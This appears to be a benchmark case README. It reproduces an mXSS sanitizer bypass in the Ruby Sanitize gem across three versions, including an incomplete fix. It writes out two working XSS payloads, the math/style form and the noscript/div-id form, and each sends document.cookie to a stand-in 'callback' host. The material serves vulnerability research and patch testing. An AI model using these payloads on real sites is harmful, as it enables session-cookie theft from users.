# ruby_sanitize_foreign_then_noscript

Sanitize (Ruby HTML sanitizer gem, rgrove/sanitize) — CVE-2020-4054 → CVE-2023-23627 (mXSS /
sanitizer-allowlist bypass via HTML parse desync, CWE-79).
**Genuine incomplete fix; gate passed on real Docker over EXTERNAL HTTP with real headless-Chromium
JS execution** (repro.log: `original @ v0` REACHES_FLAG, `original @ v1` blocked, `residual @ v1`
REACHES_FLAG, `residual @ v2` blocked; `bypass_poc_reaches_flag_on_v1: true`,
`"passed": true`, verdict "Real JS execution proven (not reflection)").

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL Sanitize gem (5.2.0/5.2.1/6.0.1, build-arg SANITIZE_VER) behind a real Rack/Sinatra/WEBrick
app (`app.rb`): `GET /?html=<payload>` runs
`Sanitize.fragment(input, Sanitize::Config.merge(RELAXED, elements: RELAXED[:elements] +
%w[noscript]))` and serves the output verbatim — the vulnerable custom allowlist BOTH advisories
describe (RELAXED for GHSA-p4x4-rw2p-8j8m; custom config adding `noscript` for
GHSA-fw3g-2h3j-qmm7). nokogiri 1.13.10 + nokogumbo 2.0.5 + crass 1.0.6 pinned identical on v0/v1
so the only variable is the sanitize gem (v2 necessarily drops nokogumbo under 6.x). A headless
Chromium victim (selenium/standalone-chromium grid) plants `session=<PCB_FLAG>` as its cookie and
views the sanitized page; an internal `callback` collector (:35190 → 9000) receives the flag ONLY
if the sanitized output mutates into a live `<img onerror>` that reads `document.cookie` —
execution, not reflection.

- **V0 = sanitize 5.2.0** (`:35120`) — `math`/`svg` NOT in `:remove_contents` -> the non-allowlisted
  `<math>` wrapper is stripped but its contents LEAK -> original executes; allowlisted `noscript`
  also passes -> residual executes.
- **V1 = sanitize 5.2.1** (`:35121`, target) — CVE-2020-4054 fix (a11498de) extends
  `:remove_contents` to `iframe math noembed noframes noscript plaintext script style svg xmp` ->
  the `<math>` subtree is stripped, server output `''` -> original BLOCKED. But `:remove_contents`
  only strips FILTERED elements — an allowlisted `noscript` is kept, and Nokogiri parses it with
  scripting DISABLED (the `</noscript>` looks like a `<div id>` attribute value) while the
  scripting-ENABLED browser parses its contents as raw text and sees the real close tag -> the
  trailing `<img onerror>` is LIVE -> residual EXECUTES. Incomplete fix.
- **V2 = sanitize 6.0.1** (`:35122`, -23627 fix) — `CleanElement` does `when 'noscript' then
  node.unlink` unconditionally -> residual BLOCKED (output `''`); math/svg still stripped ->
  original BLOCKED.

Benign canary channel: the flag is the victim browser's own cookie, exfiltrated by the mutated
`<img onerror>` navigating to `//callback:9000/c?f='+document.cookie`; server-side raw outputs
(`/raw`) are `''` on every blocked cell, `<noscript><div id="</noscript><img src=x onerror=…>
"></div></noscript>` verbatim on the v0/v1 residual cells. No command execution anywhere.

- **Original trigger**: `<math><style>/*&lt;/style&gt;&lt;img src=x
  onerror=document.location='//callback:9000/c?f='+document.cookie>*/` — Bentkowski's
  foreign-content mXSS, entity-encoded `</style>` + `<img>` smuggled through a non-allowlisted
  `<math>` wrapper (upstream regression payload `alert(1)` form).
- **Residual trigger**: `<noscript><div id="</noscript>&lt;img src=x
  onerror=document.location='//callback:9000/c?f='+document.cookie&gt; "></div>` — same sink, same
  exfil channel; only the smuggler differs: an ALLOWLISTED `<noscript>` whose close tag sits inside
  a `<div id>` attribute for scripting-disabled Nokogiri but closes the element for the browser
  (upstream 6.0.1 regression payload with `id` quotes switched so the single-quoted string nests).

Run: `python3 oracle.py --run-gate --with-v2` (victim/callback/browser services have no profile ->
always up). See `repro.log` and `case.json`.
